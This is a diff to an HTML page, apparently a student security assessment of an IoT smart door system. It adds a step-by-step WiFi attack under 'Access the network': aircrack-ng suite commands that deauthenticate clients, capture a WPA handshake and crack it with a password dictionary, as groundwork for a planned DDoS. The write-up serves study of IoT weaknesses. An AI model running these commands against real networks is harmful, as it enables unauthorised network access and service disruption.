@@ -288,7 +288,19 @@ CVSS:3.0/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:L
 For method 1, we would be performing a Distributed Denial of Service Attack (DDoS). This attack has a sole purpose of denying the end user from being able to access the IoT Device, completely stopping the Smart Door System from working. For this DDoS attack, we would be flooding the network address with an absurd amount of traffic to the point where the IoT Devices would not be able to receive any incoming commands from the IoT Gateway.
 </p>
 <h5>Step 1: Access the network of the target IoT Device </h5>
-<p></p>
+<p>
+Access Kali and kill all processes using the WiFi interface
+`airmon-ng check kill`
+Start the network adapter in monitor mode and view all nearby access points to identify target network. 
+<img src="/img/AllNearbyAP.png" alt="All Nearby AP" width="75%" height="75%">
+View all the clients that are connected to the network
+`airodump-ng -c 1 --bssid 80:35:C1:13:C1:2C -w /root wlan0mon`
+Deauthenticate all clients from the network in order to get them to re-authenticated themselves. While clients attempt to reauthenticate themselves, we would be able to capture the WPA handshake.
+`aireplay-ng -0 10 -a 80:35:C1:13:C1:2C wlan0mon`
+After obtaining the handshake, compare the handshake with a dictionary consisting of all common passwords.
+`aircrack-ng -a2 -b 80:35:C1:13:C1:2C -w /root/passwords.txt /root/hacking-01.cap`
+<img src="/img/ObtainedKey.png" alt="Obtained Key" width="75%" height="75%">
+</p>
 <h5>Step 2: Identify the target IoT Device </h5>
 <p></p>
 <h5>Step 3: Perform the Attack </h5>
